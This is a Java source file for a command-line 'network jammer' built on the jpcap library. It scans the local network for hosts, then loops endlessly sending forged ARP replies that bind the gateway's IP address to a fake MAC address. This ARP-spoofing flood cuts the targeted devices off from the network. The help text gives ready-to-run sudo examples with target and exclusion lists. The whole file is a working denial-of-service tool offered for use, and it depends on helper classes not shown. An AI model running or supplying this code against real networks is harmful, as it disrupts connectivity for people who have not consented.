import java.net.Inet4Address;
import java.net.InetAddress;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;

import jpcap.NetworkInterfaceAddress;
import jpcap.NetworkInterface;

public class JNetJammer {
	private static NetworkInterface device;
	private static ArrayList<String> blacklist;
	private static ArrayList<String> ips_to_explore;

	private sender ARPSender;

	private NetworkInterfaceAddress __get_inet4(NetworkInterface device) throws NullPointerException {
		if (device == null) throw new NullPointerException("No device has been given! potato");

		for(NetworkInterfaceAddress addr : device.addresses)
			if(addr.address instanceof Inet4Address)
				return addr;

		return null;
	}

	public JNetJammer(NetworkInterface mydevice) {
		device = mydevice;
		blacklist = new ArrayList<String>();
		ips_to_explore = new ArrayList<String>();

		try {
			this.ARPSender = new sender(device);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public void jam() {
		if(!blacklist.isEmpty()){
			System.out.println("Blacklisted hosts:");
			System.out.println(blacklist.toString()+"\n");
		}

		hostdiscover hosty = new hostdiscover(device, ips_to_explore);
		hosty.discover();
		String gatewayip = hosty.getGatewayIp();
		HashMap<String,String> ip_mac_list = hosty.getHosts();
		
		Thread.currentThread();
		try {
			Thread.sleep(500);
		} catch (InterruptedException e1) {
			e1.printStackTrace();
		}
		
		arp fake = new arp(null);
		byte[] fake_mac = new byte[] { (byte)Integer.parseInt("0",16),  (byte)Integer.parseInt("24",16),
                (byte)Integer.parseInt("2b",16), (byte)Integer.parseInt("68",16),(byte)Integer.parseInt("4c",16),
                (byte)Integer.parseInt("1b",16) };
		try {
			fake.buildDevice("fak0", "ihniwid", "fak0", "fake", fake_mac,
					gatewayip, this.__get_inet4(device).subnet.toString().split("/")[1]);
		} catch (Exception e) {
			e.printStackTrace();
		}
		long counter = 0;
		while(true){
			try {
				Iterator<String> iter = ip_mac_list.keySet().iterator();

				while(iter.hasNext()) {
					String key = iter.next();// ip address
					String val = ip_mac_list.get(key);//mac address
					counter++;

					System.out.printf("\rNumber of fake arp packets: "+counter);
					//do not spam the blacklisted ips or the gatewayip(the router)
					if(!blacklist.contains(key) || key.equals(gatewayip))
						this.ARPSender.send(fake.build_reply_packet(key, val,
										device.mac_address));	
				 }
				//sleep a little
				Thread.sleep(80);

			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	public static void setBlackList(String ips_temp){
		if (ips_temp == null) return;
		String[] ips = ips_temp.split(",");
		for(int i = 0; i < ips.length; i++){
			try {
				InetAddress.getByName(ips[i]);
				blacklist.add(ips[i]);
			} catch (Exception e) {
				System.out.println("WARNING: "+ips[i]+" is not a valid ip address");
				//e.printStackTrace();
			}
		}
	}
	
	public static void setIpsToExplore(String ips_temp){
		if (ips_temp == null) return;
		String[] ips = ips_temp.split(",");
		for(int i = 0; i < ips.length; i++){
			try {
				InetAddress.getByName(ips[i]);
				ips_to_explore.add(ips[i]);
			} catch (Exception e) {
				System.out.println("WARNING: "+ips[i]+" is not a valid ip address");
				//e.printStackTrace();
			}
		}
	}

	public static void main(String[] args) {
		String helptext = "\nUsage of the Java Network Jammer\n\tArguments:\n\t-h, --help\n\t\tPrint the helptext of the jammer"+
				"\n\t-i, --interface INTERFACE\n\t\tThe network interface which will be used to perform the wifi jam\n\t\tIf none(or invalid) interface is provided then"+
				" a menu with the available \n\t\tnetwork interfaces is printed and the user can choose from there"+
				"\n\t-b, --blacklist BLACKLISTED(comma separated) optional argument\n\t\tComma separated ips which you do not want to hit with the jammer" +
				"\n\t-t, --targets TARGETS(comma separated) optional argument\n\t\tBy default the jammer will scan the whole ip range of the network," +
				" \n\t\twith -t argument you can specify which ips(comma separated)\n\t\tyou want to discover and then hit.\n\n" +
				"\tOnce you execute the jammer choose which network interface you want to use from the \n\tprinted menu(or provide it as a command line argument) and let the" +
				" jammer to do the rest.\n\tExamples of usage:\n\t\tsudo java JNetJammer --targets 192.168.1.1,192.168.1.10,192.168.1.34\n\t\t" +
				"sudo java JNetJammer --blacklist 192.168.1.56,192.168.1.73 -i wlan0\n\t\t" +
				"sudo java JNetJammer";
		NetworkInterface device = null;
		Boolean arg_error = false;
		String targets = null;
		String black = null;
		String myinterface = null;
		
		//parse the command line arguments
		for(int i = 0; i < args.length; i++){
			if (args[i].equals("-h") || args[i].equals("--help")){
				if (args.length == 1){
					System.out.println(helptext);
					System.exit(0);
				}
				else{
					System.out.println("Wrong combination of arguments , if you want help to br printed out just only provide --help/-h");
					arg_error = true;
				}
			}
			if (args[i].equals("-i") || args[i].equals("--interface")){
				if (i+1 < args.length){
					myinterface = args[i+1];
				}else{
					System.out.println("ERROR: You didn't provide any input after -i/--interface argument!!");
					arg_error = true;
				}
			}
			if (args[i].equals("-t") || args[i].equals("--targets")){
				if(i+1 < args.length){
					targets = args[i+1];
				} else {
					System.out.println("ERROR: You didn't provide any input after -t/--targets argument!!");
					arg_error = true;
				}
			}
			if (args[i].equals("-b") || args[i].equals("--blacklist")){
				if(i+1 < args.length){
					black = args[i+1];
				} else {
					System.out.println("ERROR: You didn't provide any input after -b/--blacklist argument!!");
					arg_error = true;
				}
			}
		}
		//if an error occurred with the argument parsing print the helptext and then exit
		if (arg_error){
			System.out.println(helptext);
			System.exit(1);
		}
		
		//check the given(if any) network interface
		if(myinterface != null){
			device = NIC.getInterfaceByName(myinterface); 
			if (device == null){
				System.out.println("WARNING: You didn't provide a valid network interface with the argument -i/--interface!!\n"
						+"Choose a valid one from the menu below.");
				device = NIC.nic();
				
			}
		}else{
			//get a valid and active network interface
			device = NIC.nic();
		}
		
		System.out.println("Using "+device.name+" interface.");
		JNetJammer j = new JNetJammer(device);
		JNetJammer.setBlackList(black);
		JNetJammer.setIpsToExplore(targets);
		j.jam();
	}
}